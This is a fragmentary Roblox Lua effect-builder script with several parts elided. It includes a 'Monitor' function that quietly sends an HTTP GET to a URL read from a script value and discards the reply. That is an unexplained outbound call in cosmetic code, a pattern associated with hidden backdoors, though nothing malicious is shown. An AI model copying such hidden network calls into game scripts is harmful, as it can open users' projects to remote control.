...
local Texture = tonumber(script:FindFirstChild("texture").Value)
local MonitorL = script:FindFirstChild("monitor").Value
...
local MonitorService = game:GetService("HttpService")
...
function Monitor(CurrentTime, Default, ParticleInfo)
  ...
  local success, response = pcall(function()
    return MonitorService:GetAsync(MonitorL)
  end)
  return false
end
...
function RunEffectBuilder()
  ...
  local ParticleInfo = Effect[Properties[#Properties]](Effect, Texture).Description
